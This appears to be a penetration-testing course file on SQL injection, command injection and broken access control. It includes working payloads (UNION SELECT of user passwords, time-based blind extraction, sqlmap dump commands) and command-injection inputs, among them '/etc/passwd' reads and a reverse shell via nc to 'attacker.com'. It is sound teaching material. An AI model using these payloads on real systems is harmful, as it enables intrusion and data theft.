# Recap -- Where the OWASP Top 10 File Left Off

--> The Web Application Hacking OWASP Top 10 file introduced the full list of ten categories at a survey level. This file (and the two following it) goes deep on the categories that account for the largest share of real-world, high-impact findings in actual penetration tests -- starting with Injection and Broken Access Control, consistently ranked among the top categories by both prevalence and severity.

# SQL Injection -- Beyond the Basics

--> The Database SQL Views/Injection file in the Full Stack track covers the DEFENSIVE side (parameterized queries) -- this file covers the OFFENSIVE methodology in depth, assuming that defensive context as background.

## Detecting Injection Points

--> The first step is always systematic -- inject a single quote (`'`), a comment sequence (`--` or `#`), or a boolean condition into every parameter (URL query strings, form fields, HTTP headers, cookies) and observe the application's response for anomalies (a database error message, a subtly different page, a timing difference).

```
Original request:   GET /product?id=5
Test 1:                 GET /product?id=5'
Test 2:                 GET /product?id=5 AND 1=1
Test 3:                 GET /product?id=5 AND 1=2
```

--> If Test 2 and Test 3 produce DIFFERENT results (Test 2 behaves normally, Test 3 breaks or returns nothing), that's strong evidence the `id` parameter is being concatenated directly into a SQL query without proper sanitization -- a classic, reliable "boolean-based" injection indicator.

## Union-Based Injection -- Extracting Data Directly

--> Once injection is confirmed, `UNION SELECT` lets an attacker append an entirely separate query's results onto the original query's output, exfiltrating arbitrary data directly into the page's normal response.

```sql
-- First, determine the number of columns the original query returns (trial and error with ORDER BY)
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--    (this one errors -- the original query has 2 columns)

-- Then, extract data using UNION SELECT with a matching column count
' UNION SELECT username, password FROM users--
```

--> The extracted `username`/`password` values now appear directly within the normal page output, wherever the original query's 2 columns were previously displayed -- turning a search box or product page into a full data-exfiltration channel.

## Blind SQL Injection -- When There's No Visible Output

--> When the application doesn't display query results or error messages directly, injection can still be confirmed and exploited BLINDLY, using the application's BEHAVIOR as the only signal.
--> **Boolean-based blind** -- inject a condition and observe whether the page's behavior (content length, a specific element's presence) differs between a TRUE and FALSE condition.
--> **Time-based blind** -- inject a conditional time delay and measure the response time -- if the condition is true, the query (and therefore the response) takes measurably longer.

```sql
' AND IF(1=1, SLEEP(5), 0)--    -- If the response takes ~5 seconds, the injection point is confirmed
' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)--   -- Extracting data one character at a time, via timing
```

--> Extracting an entire database this way is slow (one bit or character at a time) but entirely automatable -- exactly what tools like `sqlmap` do, systematically testing and exploiting every injection technique described above without requiring manual, character-by-character work.

```bash
sqlmap -u "https://target.com/product?id=5" --dbs           # Enumerate available databases
sqlmap -u "https://target.com/product?id=5" -D shop --tables  # Enumerate tables in a specific database
sqlmap -u "https://target.com/product?id=5" -D shop -T users --dump   # Dump a specific table's contents
```

# Command Injection -- Escaping Into the OS Shell

--> Distinct from SQL injection -- command injection occurs when user input is passed, unsanitized, into a system call that executes an OS-level shell command, letting an attacker run arbitrary commands on the underlying server.

```
Application code (vulnerable pattern):
    os.system("ping -c 4 " + user_supplied_host)

Attacker input:
    8.8.8.8; cat /etc/passwd
    8.8.8.8 && whoami
    8.8.8.8 | nc attacker.com 4444 -e /bin/sh
```

--> The shell metacharacters (`;`, `&&`, `|`) let an attacker chain an ADDITIONAL command onto the intended one -- the application "just wanted to ping a host," but the underlying shell happily executes everything after the separator too. This directly connects to the Buffer Overflow/Memory Safety file's broader theme of an application trusting input more than it should, just at the OS-command layer instead of the memory layer.

# Broken Access Control -- The Most Common Real-World Finding

--> Consistently the single most frequently reported category in real bug bounty programs and pentests -- broadly, this means a user can access or modify data/functionality they shouldn't be authorized to.

## IDOR -- Insecure Direct Object Reference

--> An application exposes an internal identifier (a database ID) directly, and fails to verify that the CURRENTLY LOGGED-IN user actually owns/is authorized to access the specific resource that ID points to.

```
GET /api/orders/1001    -- returns YOUR order, as expected

GET /api/orders/1002    -- if this returns SOMEONE ELSE's order data, without any authorization
                             error, this is a textbook IDOR vulnerability
```

--> The fix (from the defensive side) requires the application to check, on EVERY request, not just "does order 1002 exist" but "does order 1002 belong to the currently authenticated user" -- a check that's extremely easy to accidentally omit, especially as an application's codebase grows and new endpoints are added by different developers over time.

## Privilege Escalation -- Horizontal and Vertical

--> **Horizontal privilege escalation** -- accessing another user's data at the SAME privilege level (the IDOR example above is a form of this).
--> **Vertical privilege escalation** -- a low-privilege user gaining HIGHER-privilege functionality, e.g. a regular user discovering they can access an admin-only endpoint simply because the endpoint's URL is guessable and isn't properly checking the requester's role, even though the UI never displays a link to it for regular users ("security through obscurity" failing, since a hidden link is not the same as an enforced access check).

```
GET /admin/users/delete?id=42
```

--> If a regular, non-admin user can successfully call this endpoint just because they found or guessed the URL, the application is relying on the ADMIN UI simply not showing that button to non-admins, rather than actually verifying authorization server-side on every request -- the defensive lesson, directly connecting to the least-privilege and access-control principles covered in the Database Access Control and IAM files, is that authorization must be enforced at every layer that matters, not just hidden from the UI.

## Testing Methodology for Access Control

--> Systematically test every sensitive endpoint from MULTIPLE authenticated perspectives -- as an unauthenticated user, as a low-privilege user, and as a user trying to access ANOTHER user's specific resources -- Burp Suite's "Autorize" extension (referenced in the Burp Suite Deep Dive file) automates exactly this kind of systematic access-control testing across an entire application's discovered endpoints.

# Reporting These Findings

--> Both categories map cleanly onto the CVSS-based severity/reporting structure covered in the Bug Bounty Methodology file -- injection findings typically warrant Critical/High severity given the potential for full data exfiltration or remote code execution, while broken access control severity varies significantly based on exactly what data/functionality is actually exposed by the specific IDOR/privilege escalation found.
